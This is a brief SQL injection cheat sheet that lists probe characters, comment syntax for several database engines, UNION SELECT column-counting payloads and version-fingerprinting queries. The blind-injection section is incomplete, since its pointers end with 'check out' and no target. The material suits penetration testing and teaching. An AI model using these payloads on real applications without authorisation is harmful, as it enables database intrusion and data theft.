# SQLi

## Check for SQLi
**Determine entry point:**
```
'
"
`
')
")
`)
'))
"))
`))
```
**Add comments after quote injection:**
```sql
MySQL
-- comment [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */
PostgreSQL
--comment
/*comment*/
MSQL
--comment
/*comment*/
Oracle
--comment
SQLite
--comment
/*comment*/
HQL
HQL does not support comments
```

## Union Based SQL Injection
> If you can see the output of your SQL query then this is the best way to exploit it

**Determine number of columns:**
```sql
'' UNION SELECT null, null, null... -- 
```
**Determine number of columns for Oracle:**
```sql
'' UNION SELECT null, null... FROM dual -- 
```
**Get database version**:
```sql
MySQL, Microsoft
SELECT @@version
PostgreSQL
SELECT version()
Oracle
SELECT banner FROM v$version
SELECT version FROM v$instance
```



## Blind SQLi
If you cant see the output of your SQL query then this is the way to go ╰(*°▽°*)╯


**If it does not seem to return specific results depending on your injection...**
- ...and it does not seem to be modifying the response of the application in any way, check out 
- ...and your query triggers a boolean response from the application (i.e. 200/500, or a generic success/fail message in the page), check out